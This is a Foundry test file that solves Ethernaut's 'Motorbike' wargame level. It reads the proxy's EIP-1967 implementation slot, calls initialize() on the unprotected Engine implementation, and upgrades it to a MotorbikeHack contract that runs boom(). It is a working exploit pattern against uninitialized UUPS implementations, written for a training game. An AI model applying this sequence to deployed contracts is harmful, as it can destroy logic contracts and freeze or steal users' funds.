// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/25-Motorbike/Motorbike.sol";
import "../src/25-Motorbike/MotorbikeFactory.sol";
import "../src/25-Motorbike/MotorbikeHack.sol";

contract MotorbikeTest is Test {
    Ethernaut ethernaut;
    MotorbikeFactory level;
    Motorbike instance;
    MotorbikeHack hack;
    address instanceAddress;
    address player = address(123456);

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new MotorbikeFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Motorbike(payable(instanceAddress));
    }

    function testMotorbikeHack() public {
        bytes32 implementationSlot = bytes32(
            uint256(keccak256("eip1967.proxy.implementation")) - 1
        );

        address engineAddress = address(
            uint160(uint256(vm.load(instanceAddress, implementationSlot)))
        );

        Engine engine = Engine(engineAddress);
        engine.initialize();

        hack = new MotorbikeHack();
        engine.upgradeToAndCall(
            address(hack),
            abi.encodeWithSignature("boom()")
        );

        // bool levelCompleted = ethernaut.submitLevelInstance(
        //     payable(instanceAddress)
        // );
        // assert(levelCompleted);
    }
}
